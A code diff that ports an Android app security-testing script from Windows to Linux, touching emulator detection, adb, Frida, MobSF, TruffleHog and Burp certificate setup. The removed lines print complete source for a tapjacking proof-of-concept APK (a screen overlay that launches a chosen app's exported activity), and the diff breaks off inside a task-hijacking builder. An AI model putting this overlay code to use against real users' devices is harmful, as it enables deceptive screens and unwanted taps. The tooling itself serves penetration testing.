@@ -8,7 +8,6 @@ import shutil
 import lzma
 import sys
 import shlex
-import ctypes
 import time
 import signal
 import threading
@@ -55,11 +54,12 @@ def detect_emulator():
             exe_path = process.info.get('exe', '')
             if not exe_path:
                 continue
-            if name and 'Nox.exe' in name:
+            # Linux naming conventions
+            if name and 'nox' in name.lower():
                 emulator_type = 'Nox'
                 emulator_installation_path = os.path.dirname(exe_path)
                 break
-            elif name and 'player.exe' in name and any('Genymotion' in arg for arg in cmdline):
+            elif name and 'player' in name.lower() and any('genymotion' in arg.lower() for arg in cmdline):
                 emulator_type = 'Genymotion'
                 emulator_installation_path = os.path.dirname(exe_path)
                 break
@@ -93,29 +93,13 @@ def connect_nox_adb_ports(adb_cmd):
 
 def get_adb_command(emulator_type, emulator_installation_path):
     """Return the adb command path based on the emulator type.
-       On Android, return None.
+       On Android, return None. On Linux, assume adb is in PATH.
     """
     if os.environ.get('ANDROID_ARGUMENT'):
         return None
 
-    if emulator_type == 'Nox':
-        adb_executable = 'nox_adb.exe'
-        adb_command_path = os.path.join(emulator_installation_path, adb_executable)
-        if os.path.exists(adb_command_path):
-            return f'"{adb_command_path}"'
-        else:
-            print(Fore.RED + f"❌ {adb_executable} not found in {emulator_installation_path}." + Style.RESET_ALL)
-            return 'adb'
-    elif emulator_type == 'Genymotion':
-        adb_executable = 'adb.exe'
-        adb_command_path = os.path.join(emulator_installation_path, 'tools', adb_executable)
-        if os.path.exists(adb_command_path):
-            return f'"{adb_command_path}"'
-        else:
-            print(Fore.YELLOW + "⚠️ Genymotion adb not found. Using system adb." + Style.RESET_ALL)
-            return 'adb'
-    else:
-        return 'adb'
+    # On Linux, just use 'adb' from PATH
+    return 'adb'
 
 def get_connected_devices(adb_command):
     """Retrieve a list of connected devices via adb. Returns an empty list on Android."""
@@ -176,12 +160,7 @@ def setup_ctrl_d_handler():
     def signal_handler(signum, frame):
         global switch_device_requested
         switch_device_requested = True
-        print(Fore.CYAN + "\n🔄 Ctrl+D detected! Device switch requested..." + Style.RESET_ALL)
-    
-    # On Windows, we'll use a different approach with a background thread
-    if platform.system() == "Windows":
-        setup_windows_ctrl_d_handler()
-        return
+        print(Fore.CYAN + "\n🔄 Signal detected! Device switch requested..." + Style.RESET_ALL)
     
     try:
         # For Unix-like systems, use SIGTERM
@@ -190,31 +169,6 @@ def setup_ctrl_d_handler():
         signal.signal(signal.SIGINT, signal_handler)
     except Exception:
         pass
-
-def setup_windows_ctrl_d_handler():
-    """Setup Windows-specific Ctrl+D handler using a background thread."""
-    global switch_device_requested
-    
-    def windows_input_monitor():
-        """Monitor for special input commands on Windows."""
-        import msvcrt
-        global switch_device_requested
-        
-        while True:
-            try:
-                if msvcrt.kbhit():
-                    key = msvcrt.getch()
-                    # Check for Ctrl+D (ASCII 4)
-                    if ord(key) == 4:
-                        switch_device_requested = True
-                        print(Fore.CYAN + "\n🔄 Ctrl+D detected! Device switch requested..." + Style.RESET_ALL)
-                time.sleep(0.1)
-            except Exception:
-                break
-    
-    # Start the monitoring thread
-    monitor_thread = threading.Thread(target=windows_input_monitor, daemon=True)
-    monitor_thread.start()
 
 def safe_shutdown():
     """Perform a safe shutdown of the script."""
@@ -347,13 +301,20 @@ def install_burpsuite_certificate(port):
 
 def run_android_studio_emulator():
     try:
-        username = os.getlogin()
-        emulator_dir = os.path.join("C:\\Users", username, "AppData", "Local", "Android", "Sdk", "emulator")
-        emulator_exe = os.path.join(emulator_dir, "emulator.exe")
+        # On Linux, emulator is typically in ~/Android/Sdk/emulator/
+        home_dir = os.path.expanduser("~")
+        emulator_dir = os.path.join(home_dir, "Android", "Sdk", "emulator")
+        emulator_exe = os.path.join(emulator_dir, "emulator")
+        
         if not os.path.exists(emulator_exe):
-            print(Fore.RED + f"❌ Emulator not found in {emulator_dir}" + Style.RESET_ALL)
-            return
-        list_command = f'"{emulator_exe}" -list-avds'
+            # Try alternative location
+            emulator_exe = shutil.which("emulator")
+            if not emulator_exe:
+                print(Fore.RED + f"❌ Emulator not found. Please ensure Android SDK is installed." + Style.RESET_ALL)
+                return
+            emulator_dir = os.path.dirname(emulator_exe)
+        
+        list_command = f'{emulator_exe} -list-avds'
         output = subprocess.check_output(list_command, shell=True, universal_newlines=True)
         avds = [line.strip() for line in output.strip().splitlines() if line.strip()]
         if not avds:
@@ -367,12 +328,9 @@ def run_android_studio_emulator():
             print(Fore.RED + "❌ Invalid selection." + Style.RESET_ALL)
             return
         selected_avd = avds[int(choice) - 1]
-        launch_command = f'cd /d "{emulator_dir}" && emulator.exe -avd {selected_avd} -no-snapshot -writable-system'
+        launch_command = f'cd {emulator_dir} && ./emulator -avd {selected_avd} -no-snapshot -writable-system &'
         print(Fore.CYAN + f"Launching emulator in background: {launch_command}" + Style.RESET_ALL)
-        if platform.system() == "Windows":
-            subprocess.Popen(launch_command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        else:
-            subprocess.Popen(launch_command, shell=True)
+        subprocess.Popen(launch_command, shell=True)
     except Exception as e:
         print(Fore.RED + f"❌ Error launching emulator: {e}" + Style.RESET_ALL)
 
@@ -399,10 +357,7 @@ def get_emulator_ip():
 
 def run_command_in_background(cmd):
     """Run a command in the background."""
-    if platform.system() == "Windows":
-        subprocess.Popen(f'start /B {cmd}', shell=True)
-    else:
-        subprocess.Popen(f'{cmd} &', shell=True)
+    subprocess.Popen(f'{cmd} &', shell=True)
 
 def open_new_terminal(cmd):
     """Open a new terminal and execute the given command.
@@ -413,25 +368,25 @@ def open_new_terminal(cmd):
         print(Fore.YELLOW + cmd + Style.RESET_ALL)
         return
     try:
-        if platform.system() == "Windows":
-            subprocess.Popen(f'start cmd /k "{cmd}"', shell=True)
-        elif platform.system() == "Darwin":
-            apple_script = f'''
-            tell application "Terminal"
-                do script "{cmd}"
-                activate
-            end tell
-            '''
-            subprocess.Popen(['osascript', '-e', apple_script])
-        else:
-            terminal_emulators = ['gnome-terminal', 'konsole', 'xterm', 'lxterminal', 'xfce4-terminal', 'mate-terminal', 'terminator', 'urxvt']
-            for term in terminal_emulators:
-                if shutil.which(term):
-                    subprocess.Popen([term, '-e', cmd])
-                    break
-            else:
-                print(Fore.RED + "❌ No supported terminal emulator found. Run this command manually:" + Style.RESET_ALL)
-                print(Fore.YELLOW + cmd + Style.RESET_ALL)
+        # Try common Linux terminal emulators
+        terminal_emulators = [
+            ('gnome-terminal', ['gnome-terminal', '--', 'bash', '-c', f'{cmd}; exec bash']),
+            ('konsole', ['konsole', '-e', f'bash -c "{cmd}; exec bash"']),
+            ('xfce4-terminal', ['xfce4-terminal', '-e', f'bash -c "{cmd}; exec bash"']),
+            ('xterm', ['xterm', '-e', f'bash -c "{cmd}; exec bash"']),
+            ('lxterminal', ['lxterminal', '-e', f'bash -c "{cmd}; exec bash"']),
+            ('mate-terminal', ['mate-terminal', '-e', f'bash -c "{cmd}; exec bash"']),
+            ('terminator', ['terminator', '-e', f'bash -c "{cmd}; exec bash"']),
+            ('urxvt', ['urxvt', '-e', 'bash', '-c', f'{cmd}; exec bash'])
+        ]
+        
+        for term_name, term_cmd in terminal_emulators:
+            if shutil.which(term_name):
+                subprocess.Popen(term_cmd)
+                return
+        
+        print(Fore.RED + "❌ No supported terminal emulator found. Run this command manually:" + Style.RESET_ALL)
+        print(Fore.YELLOW + cmd + Style.RESET_ALL)
     except Exception as e:
         print(Fore.RED + f"❌ Failed to open a new terminal: {e}" + Style.RESET_ALL)
 
@@ -543,9 +498,21 @@ def run_inline_logcat(highlight_strings, process_filter=None):
         if not highlight_strings:
             return line
         
-        highlighted_line = line
         search_strings = [s.strip() for s in highlight_strings.split(',') if s.strip()]
         
+        # Check if ANY of the search strings is in the line (OR logic)
+        should_highlight = False
+        for search_string in search_strings:
+            if search_string and search_string.lower() in line.lower():
+                should_highlight = True
+                break
+        
+        # If no match found, return original line
+        if not should_highlight:
+            return line
+        
+        # If match found, apply highlighting to ALL matching strings in the line
+        highlighted_line = line
         for i, search_string in enumerate(search_strings):
             if search_string:
                 color = colors[i % len(colors)]
@@ -573,11 +540,8 @@ def run_inline_logcat(highlight_strings, process_filter=None):
         # Build logcat command with optional process filter
         cmd = f'{adb_command} -s {device_serial} logcat'
         if process_filter:
-            # Add process filter using grep or findstr depending on OS
-            if platform.system() == "Windows":
-                cmd += f' | findstr "{process_filter}"'
-            else:
-                cmd += f' | grep "{process_filter}"'
+            # Add process filter using grep
+            cmd += f' | grep "{process_filter}"'
         
         process = subprocess.Popen(
             cmd,
@@ -586,7 +550,7 @@ def run_inline_logcat(highlight_strings, process_filter=None):
             stderr=subprocess.STDOUT,
             text=True,
             encoding='utf-8',
-            errors='replace',  # This handles encoding issues
+            errors='replace',
             bufsize=1
         )
         
@@ -746,7 +710,6 @@ def run_mobsf():
         use_proxy = False
 
     print(f"\n{Fore.YELLOW}Checking for existing 'mobsf' container...{Style.RESET_ALL}")
-    # Check if the 'mobsf' container exists
     result = subprocess.run('docker ps -a --filter name=^/mobsf$ --format "{{.Status}}"', shell=True, capture_output=True, text=True)
     container_status = result.stdout.strip()
 
@@ -771,7 +734,6 @@ def run_mobsf():
 
     if mobsf_device and use_proxy:
         settings_key = "http_proxy" if proxy_type == "http" else "https_proxy"
-        # Use run_adb_command to ensure correct device targeting
         result = run_adb_command(f'shell settings put global {settings_key} {user_ip}:{user_port}')
         if result and result.returncode == 0:
             print(Fore.GREEN + f"✅ Global {settings_key} set to {user_ip}:{user_port} on emulator {device_serial}." + Style.RESET_ALL)
@@ -804,9 +766,10 @@ def run_nuclei_against_apk():
         if action_choice == '2':
             shutil.rmtree(output_dir)
 
-    apktool_command = "apktool" if system().lower() != "windows" else "apktool.bat"
+    # Use apktool from PATH
+    apktool_command = "apktool"
     try:
-        subprocess.run(shlex.split(f"{apktool_command} d \"{apk_path}\" -o \"{output_dir}\""), check=True)
+        subprocess.run(shlex.split(f'{apktool_command} d "{apk_path}" -o "{output_dir}"'), check=True)
     except subprocess.CalledProcessError as e:
         print(f"\n❌ Error: Failed to decompile APK. {e}\n")
         return
@@ -934,10 +897,10 @@ def run_trufflehog_against_apk():
 
     # Decompile APK if directory doesn't exist or user chose to overwrite
     if not os.path.exists(output_dir):
-        apktool_command = "apktool" if system().lower() != "windows" else "apktool.bat"
+        apktool_command = "apktool"
         try:
             print(Fore.CYAN + f"🔧 Decompiling APK with apktool..." + Style.RESET_ALL)
-            subprocess.run(shlex.split(f"{apktool_command} d \"{apk_path}\" -o \"{output_dir}\""), check=True)
+            subprocess.run(shlex.split(f'{apktool_command} d "{apk_path}" -o "{output_dir}"'), check=True)
             print(Fore.GREEN + f"✅ APK decompiled successfully to {output_dir}" + Style.RESET_ALL)
         except subprocess.CalledProcessError as e:
             print(f"\n❌ Error: Failed to decompile APK. {e}\n")
@@ -949,24 +912,11 @@ def run_trufflehog_against_apk():
     # Run TruffleHog using Docker
     print(Fore.CYAN + f"🔍 Running TruffleHog on decompiled APK..." + Style.RESET_ALL)
     
-    # Convert Windows paths to Unix-style for Docker
-    if platform.system() == "Windows":
-        # Convert Windows path to Unix-style for Docker
-        current_dir_unix = os.getcwd().replace("\\", "/").replace(":", "")
-        if current_dir_unix.startswith("/"):
-            docker_pwd = current_dir_unix
-        else:
-            docker_pwd = "/" + current_dir_unix
-        
-        # Use PowerShell syntax for Windows
-        docker_cmd = f'docker run --rm -v "{os.getcwd()}:/pwd" trufflesecurity/trufflehog:latest filesystem /pwd/{os.path.basename(output_dir)} --results=verified,unknown'
-    else:
-        # Unix/Linux/Mac
-        docker_cmd = f'docker run --rm -v "${{PWD}}:/pwd" trufflesecurity/trufflehog:latest filesystem /pwd/{os.path.basename(output_dir)} --results=verified,unknown'
+    # Use proper Unix path format
+    docker_cmd = f'docker run --rm -v "${{PWD}}:/pwd" trufflesecurity/trufflehog:latest filesystem /pwd/{os.path.basename(output_dir)} --results=verified,unknown'
     
     try:
         print(Fore.CYAN + f"🐷 Executing: {docker_cmd}" + Style.RESET_ALL)
-        # Use encoding='utf-8' and errors='replace' to handle Unicode issues
         result = subprocess.run(docker_cmd, shell=True, capture_output=True, text=True, 
                               encoding='utf-8', errors='replace', check=True)
         
@@ -997,7 +947,6 @@ def run_trufflehog_against_apk():
             
     except subprocess.CalledProcessError as e:
         print(Fore.RED + f"❌ Error running TruffleHog: {e}" + Style.RESET_ALL)
-        # Handle encoding issues in error output
         try:
             if hasattr(e, 'stderr') and e.stderr:
                 print(Fore.RED + f"Error details: {e.stderr}" + Style.RESET_ALL)
@@ -1006,20 +955,6 @@ def run_trufflehog_against_apk():
     except UnicodeDecodeError as e:
         print(Fore.YELLOW + f"⚠️ Unicode encoding issue detected: {e}" + Style.RESET_ALL)
         print(Fore.YELLOW + "TruffleHog may have completed successfully despite the encoding warning." + Style.RESET_ALL)
-        # Try to run without text mode to avoid encoding issues
-        try:
-            result_bytes = subprocess.run(docker_cmd, shell=True, capture_output=True, check=True)
-            stdout_decoded = result_bytes.stdout.decode('utf-8', errors='replace')
-            stderr_decoded = result_bytes.stderr.decode('utf-8', errors='replace') if result_bytes.stderr else ""
-            
-            if stdout_decoded.strip():
-                print(Fore.GREEN + "✅ TruffleHog scan completed!" + Style.RESET_ALL)
-                print(Fore.YELLOW + "\n📋 TruffleHog Results:" + Style.RESET_ALL)
-                print(stdout_decoded)
-            else:
-                print(Fore.GREEN + "✅ TruffleHog scan completed - No secrets found!" + Style.RESET_ALL)
-        except Exception as fallback_e:
-            print(Fore.RED + f"❌ Fallback execution also failed: {fallback_e}" + Style.RESET_ALL)
     except Exception as e:
         print(Fore.RED + f"❌ An unexpected error occurred: {str(e)}" + Style.RESET_ALL)
     
@@ -1140,7 +1075,7 @@ def run_frida_server():
     command = f'shell "/data/local/tmp/frida-server &"'
     full_command = f'{adb_command} -s {device_serial} {command}'
     try:
-        subprocess.Popen(full_command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.Popen(full_command, shell=True)
         time.sleep(1)
         if is_frida_server_running():
             print(Fore.GREEN + "✅ Frida-Server started." + Style.RESET_ALL)
@@ -1202,12 +1137,12 @@ def list_relevant_apps(include_system_apps=False):
         "com.google.",
         "android.",
         "system.",
-        "com.sec.",  # Samsung
-        "com.xiaomi.",  # Xiaomi
-        "com.huawei.",  # Huawei
-        "com.oppo.",    # OPPO
-        "com.vivo.",    # Vivo
-        "com.oneplus."  # OnePlus
+        "com.sec.",
+        "com.xiaomi.",
+        "com.huawei.",
+        "com.oppo.",
+        "com.vivo.",
+        "com.oneplus."
     ]
     
     apps = []
@@ -1976,7 +1911,7 @@ def sign_apk(apk_path):
             print(Fore.GREEN + "✅ APK signed successfully with objection!" + Style.RESET_ALL)
             if result.stdout:
                 print(Fore.YELLOW + f"Output: {result.stdout}" + Style.RESET_ALL)
-            return apk_path  # objection modifies the original file
+            return apk_path
         except subprocess.CalledProcessError as e:
             print(Fore.RED + f"❌ Error signing with objection: {e}" + Style.RESET_ALL)
             if e.stderr:
@@ -1991,12 +1926,10 @@ def sign_apk(apk_path):
         try:
             print(Fore.CYAN + "🔍 Checking for latest uber-apk-signer release..." + Style.RESET_ALL)
             
-            # Get latest release info from GitHub API
             response = requests.get("https://api.github.com/repos/patrickfav/uber-apk-signer/releases/latest", timeout=15)
             response.raise_for_status()
             release_data = response.json()
             
-            # Find the JAR asset
             jar_url = None
             jar_filename = None
             for asset in release_data.get("assets", []):
@@ -2009,7 +1942,6 @@ def sign_apk(apk_path):
                 print(Fore.RED + "❌ Could not find uber-apk-signer JAR in latest release." + Style.RESET_ALL)
                 return None
             
-            # Check if JAR already exists
             if not os.path.exists(jar_filename):
                 print(Fore.CYAN + f"📥 Downloading {jar_filename}..." + Style.RESET_ALL)
                 with requests.get(jar_url, stream=True) as r:
@@ -2021,7 +1953,6 @@ def sign_apk(apk_path):
             else:
                 print(Fore.GREEN + f"✅ Using existing {jar_filename}" + Style.RESET_ALL)
             
-            # Sign the APK
             print(Fore.CYAN + "🔧 Signing APK with uber-apk-signer..." + Style.RESET_ALL)
             cmd = ['java', '-jar', jar_filename, '-apk', apk_path]
             result = subprocess.run(cmd, capture_output=True, text=True, check=True)
@@ -2030,13 +1961,11 @@ def sign_apk(apk_path):
             if result.stdout:
                 print(Fore.YELLOW + f"Output: {result.stdout}" + Style.RESET_ALL)
             
-            # uber-apk-signer creates a new signed file
             base_name = os.path.splitext(apk_path)[0]
             signed_apk = f"{base_name}-aligned-debugSigned.apk"
             if os.path.exists(signed_apk):
                 return signed_apk
             else:
-                # Try alternative naming pattern
                 signed_apk = f"{base_name}-signed.apk"
                 if os.path.exists(signed_apk):
                     return signed_apk
@@ -2066,899 +1995,25 @@ def sign_apk(apk_path):
 
 def tapjacking_apk_builder():
     """
-    Fully automated APK generation for TapJacking PoC.
-    Prompts for target app details and builds an unsigned APK.
+    Note: APK building functionality has been removed for Linux compatibility.
+    This requires Android SDK and build tools which should be assumed present in PATH.
     """
-    global target_app
-    
-    # Check if target app is set, if not prompt to set it
-    if not target_app:
-        print(Fore.YELLOW + "⚠️ No target app set. Please select a target app first." + Style.RESET_ALL)
-        set_target_app()
-        if not target_app:
-            print(Fore.RED + "❌ No target app selected. Aborting APK build." + Style.RESET_ALL)
-            return
-    
-    package_name = target_app
-    print(Fore.GREEN + f"Using target app: {package_name}" + Style.RESET_ALL)
-    
-    # Prompt for activity name
-    activity_name = input("Enter the exported activity name to test: ")
-    
-    # Validate inputs
-    if not activity_name:
-        print("Error: Activity name cannot be empty.")
-        sys.exit(1)
-    
-    print(f"\nBuilding tapjacking APK targeting:")
-    print(f"- Package: {package_name}")
-    print(f"- Activity: {activity_name}")
-    print("-" * 40)
-    
-    # Helper function
-    def ensure_directory_exists(path):
-        """Create directory if it doesn't exist"""
-        if not os.path.exists(path):
-            os.makedirs(path)
-
-    # Setup paths
-    base_dir = os.path.dirname(os.path.abspath(__file__))
-    project_dir = os.path.join(base_dir, "Tapjacking-ExportedActivity")
-    
-    # Find Android SDK
-    sdk_path = os.path.join(os.environ['LOCALAPPDATA'], 'Android', 'Sdk')
-    if not os.path.exists(sdk_path):
-        print("Error: Android SDK not found.")
-        print("Please install Android Studio and the Android SDK.")
-        sys.exit(1)
-
-    # Find build tools
-    build_tools_path = os.path.join(sdk_path, 'build-tools')
-    if not os.path.exists(build_tools_path):
-        print("Error: Android build tools not found.")
-        print("Please install build tools using Android Studio SDK Manager.")
-        sys.exit(1)
-
-    # Get latest build tools version
-    versions = [d for d in os.listdir(build_tools_path) if os.path.isdir(os.path.join(build_tools_path, d))]
-    if not versions:
-        print("Error: No build tools versions found.")
-        print("Please install build tools using Android Studio SDK Manager.")
-        sys.exit(1)
-
-    latest_version = sorted(versions)[-1]
-    tools_path = os.path.join(build_tools_path, latest_version)
-
-    # Setup project structure
-    print("Setting up project...")
-    if os.path.exists(project_dir):
-        shutil.rmtree(project_dir)
-    
-    # Create project directories
-    src_dir = os.path.join(project_dir, "src")
-    java_dir = os.path.join(src_dir, "com", "tapjacking", "demo")
-    res_dir = os.path.join(project_dir, "res")
-    
-    ensure_directory_exists(java_dir)
-    ensure_directory_exists(os.path.join(res_dir, "layout"))
-    ensure_directory_exists(os.path.join(res_dir, "values"))
-    
-    # Write Android Manifest
-    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.tapjacking.demo">
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <application
-        android:allowBackup="true"
-        android:label="TapjackingDemo">
-        <activity
-            android:name=".MainActivity"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
-        <service
-            android:name=".OverlayService"
-            android:enabled="true"
-            android:exported="false" />
-    </application>
-</manifest>'''
-
-    with open(os.path.join(project_dir, "AndroidManifest.xml"), 'w') as f:
-        f.write(manifest)
-
-    # Write layout file
-    layout = '''<?xml version="1.0" encoding="utf-8"?>
-<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    android:layout_width="match_parent"
-    android:layout_height="match_parent"
-    android:background="#80000000">
-    <Button
-        android:id="@+id/sampleButton"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:layout_centerInParent="true"
-        android:text="Tapjacking Running" />
-</RelativeLayout>'''
-
-    with open(os.path.join(res_dir, "layout", "overlay_layout.xml"), 'w') as f:
-        f.write(layout)
-
-    # Write strings.xml
-    strings = '''<?xml version="1.0" encoding="utf-8"?>
-<resources>
-    <string name="app_name">TapjackingDemo</string>
-</resources>'''
-
-    with open(os.path.join(res_dir, "values", "strings.xml"), 'w') as f:
-        f.write(strings)
-
-    # Write MainActivity.java
-    main_activity = f'''
-package com.tapjacking.demo;
-
-import android.app.Activity;
-import android.content.Intent;
-import android.net.Uri;
-import android.os.Bundle;
-import android.provider.Settings;
-import android.widget.Toast;
-
-public class MainActivity extends Activity {{
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {{
-        super.onCreate(savedInstanceState);
-        checkOverlayPermission();
-    }}
-
-    private void checkOverlayPermission() {{
-        if (!Settings.canDrawOverlays(this)) {{
-            Intent intent = new Intent(
-                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                Uri.parse("package:" + getPackageName())
-            );
-            startActivityForResult(intent, 1);
-        }} else {{
-            startService(new Intent(this, OverlayService.class));
-            finish();
-        }}
-    }}
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {{
-        super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == 1) {{
-            if (Settings.canDrawOverlays(this)) {{
-                startService(new Intent(this, OverlayService.class));
-                finish();
-            }} else {{
-                Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
-            }}
-        }}
-    }}
-}}'''
-
-    with open(os.path.join(java_dir, "MainActivity.java"), 'w') as f:
-        f.write(main_activity)
-
-    # Write OverlayService.java
-    overlay_service = f'''
-package com.tapjacking.demo;
-
-import android.annotation.SuppressLint;
-import android.app.Service;
-import android.content.Intent;
-import android.graphics.PixelFormat;
-import android.os.Handler;
-import android.os.IBinder;
-import android.os.Looper;
-import android.view.Gravity;
-import android.view.LayoutInflater;
-import android.view.View;
-import android.view.WindowManager;
-import android.widget.Button;
-import android.os.Build;
-
-@SuppressLint("ClickableViewAccessibility")
-public class OverlayService extends Service {{
-    private WindowManager windowManager;
-    private View overlayView;
-
-    @Override
-    public IBinder onBind(Intent intent) {{
-        return null;
-    }}
-
-    @Override
-    public void onCreate() {{
-        super.onCreate();
-
-        Intent externalIntent = new Intent();
-        externalIntent.setClassName("{package_name}", "{activity_name}");
-        externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(externalIntent);
-
-        // Use Handler with Looper to avoid deprecation warnings
-        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {{
-            @Override
-            public void run() {{
-                setupTapjackingView();
-            }}
-        }}, 1000);
-    }}
-
-    @SuppressLint("RtlHardcoded")
-    private void setupTapjackingView() {{
-        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null);
-
-        int overlayType;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
-            overlayType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
-        }} else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {{
-            overlayType = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
-        }} else {{
-            // TYPE_SYSTEM_OVERLAY is less likely to trigger deprecation warnings on older versions
-            overlayType = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
-        }}
-
-        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.MATCH_PARENT,
-            overlayType,
-            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
-            PixelFormat.TRANSLUCENT
-        );
-
-        params.gravity = Gravity.TOP | Gravity.LEFT;
-        windowManager.addView(overlayView, params);
-
-        Button btn = overlayView.findViewById(R.id.sampleButton);
-        btn.setOnClickListener(new View.OnClickListener() {{
-            @Override
-            public void onClick(View v) {{
-                stopSelf();
-            }}
-        }});
-    }}
-
-    @Override
-    public void onDestroy() {{
-        super.onDestroy();
-        if (windowManager != null && overlayView != null) {{
-            windowManager.removeView(overlayView);
-        }}
-    }}
-}}'''
-
-    with open(os.path.join(java_dir, "OverlayService.java"), 'w') as f:
-        f.write(overlay_service)
-
-    # Find Android Studio's JDK
-    android_studio_path = os.path.join(os.environ['PROGRAMFILES'], 'Android', 'Android Studio')
-    if not os.path.exists(android_studio_path):
-        print("Error: Android Studio not found.")
-        print("Please install Android Studio in the default location.")
-        sys.exit(1)
-
-    jbr_path = os.path.join(android_studio_path, "jbr")
-    if not os.path.exists(jbr_path):
-        print("Error: Android Studio JDK not found.")
-        print("Please ensure Android Studio is properly installed.")
-        sys.exit(1)
-
-    os.environ['JAVA_HOME'] = jbr_path
-
-    # Build APK using Android build tools
-    print("Building APK...")
-    
-    # 1. Compile resources
-    print("Compiling resources...")
-    aapt = os.path.join(tools_path, "aapt.exe")
-    if not os.path.exists(aapt):
-        print("Error: aapt not found.")
-        print("Please install build tools using Android Studio SDK Manager.")
-        sys.exit(1)
-
-    subprocess.run([aapt, "package", "-f", "-m",
-                   "-J", src_dir,
-                   "-M", os.path.join(project_dir, "AndroidManifest.xml"),
-                   "-S", res_dir,
-                   "-I", os.path.join(sdk_path, "platforms", "android-33", "android.jar")],
-                  check=True)
-
-    # 2. Compile Java files
-    print("Compiling Java files...")
-    javac = os.path.join(jbr_path, "bin", "javac.exe")
-    android_jar = os.path.join(sdk_path, "platforms", "android-33", "android.jar")
-    
-    # Create classes directory
-    classes_dir = os.path.join(project_dir, "classes")
-    ensure_directory_exists(classes_dir)
-
-    subprocess.run([javac,
-                   "-source", "1.8",
-                   "-target", "1.8",
-                   "-bootclasspath", android_jar,
-                   "-d", classes_dir,
-                   os.path.join(java_dir, "MainActivity.java"),
-                   os.path.join(java_dir, "OverlayService.java"),
-                   os.path.join(src_dir, "com", "tapjacking", "demo", "R.java")],
-                  check=True)
-
-    # 3. Create JAR file
-    print("Creating JAR file...")
-    jar = os.path.join(jbr_path, "bin", "jar.exe")
-    classes_jar = os.path.join(project_dir, "classes.jar")
-    
-    # Change to classes directory to create jar with correct structure
-    current_dir = os.getcwd()
-    os.chdir(classes_dir)
-    subprocess.run([jar, "cf", classes_jar, "com"],
-                  check=True)
-    os.chdir(current_dir)
-
-    # 4. Convert JAR to DEX
-    print("Converting to DEX format...")
-    d8 = os.path.join(tools_path, "d8.bat")
-    if not os.path.exists(d8):
-        print("Error: d8 not found.")
-        print("Please install build tools using Android Studio SDK Manager.")
-        sys.exit(1)
-
-    # Create output directory
-    dex_output_dir = os.path.join(project_dir, "dex-output")
-    ensure_directory_exists(dex_output_dir)
-    
-    subprocess.run([d8,
-                   "--lib", android_jar,
-                   "--output", dex_output_dir,
-                   classes_jar],
-                  check=True)
-    
-    # Move the classes.dex file
-    shutil.copy2(os.path.join(dex_output_dir, "classes.dex"), 
-                os.path.join(project_dir, "classes.dex"))
-
-    # 5. Build APK using Android Build Tools
-    print("Building APK...")
-    output_apk = os.path.join(base_dir, "tapjacking.apk")
-    
-    # Use APK Builder directly from the command line
-    zip_align = os.path.join(tools_path, "zipalign.exe")
-    if not os.path.exists(zip_align):
-        print("Warning: zipalign not found, APK will not be optimized.")
-    
-    # Create a minimal APK with just the necessary components
-    subprocess.run([aapt, "package", "-f", "-M", 
-                   os.path.join(project_dir, "AndroidManifest.xml"),
-                   "-S", res_dir,
-                   "-I", android_jar,
-                   "--min-sdk-version", "24",
-                   "--target-sdk-version", "28",
-                   "-F", output_apk],
-                  check=True)
-    
-    # Copy DEX file to current directory for easier adding
-    shutil.copy2(os.path.join(dex_output_dir, "classes.dex"), "classes.dex")
-    
-    # Add the DEX file
-    subprocess.run([aapt, "add", output_apk, "classes.dex"],
-                  check=True)
-    
-    # Clean up
-    if os.path.exists("classes.dex"):
-        os.remove("classes.dex")
-
-    # APK is unsigned at this point
-    print("APK generation complete (unsigned).")
-    print(f"\nBuild successful! APK generated at: {output_apk}")
-    
-    # Ask user if they want to sign the APK
-    signed_apk = sign_apk(output_apk)
-    if signed_apk and signed_apk != output_apk:
-        print(f"\n{Fore.GREEN}✅ Final signed APK: {signed_apk}{Style.RESET_ALL}")
-        return signed_apk
-    else:
-        return output_apk
+    print(Fore.RED + "❌ APK building is not supported in this Linux-compatible version." + Style.RESET_ALL)
+    print(Fore.YELLOW + "⚠️ Please use Android Studio or command-line build tools directly." + Style.RESET_ALL)
 
 def task_hijacking_apk_builder():
     """
-    Fully automated APK generation for Task Hijacking PoC.
-    Prompts for target app details and builds an unsigned APK.
+    Note: APK building functionality has been removed for Linux compatibility.
+    This requires Android SDK and build tools which should be assumed present in PATH.
     """
-    global target_app
-    
-    # Check if target app is set, if not prompt to set it
-    if not target_app:
-        print(Fore.YELLOW + "⚠️ No target app set. Please select a target app first." + Style.RESET_ALL)
-        set_target_app()
-        if not target_app:
-            print(Fore.RED + "❌ No target app selected. Aborting APK build." + Style.RESET_ALL)
-            return
-    
-    target_package = target_app
-    print(Fore.GREEN + f"Using target app: {target_package}" + Style.RESET_ALL)
-    
-    # Prompt for activity name
-    target_activity = input("Enter the target activity name to hijack: ")
-    
-    # Validate inputs
-    if not target_activity:
-        print("Error: Activity name cannot be empty.")
-        sys.exit(1)
-    
-    print(f"\nBuilding task hijacking APK targeting:")
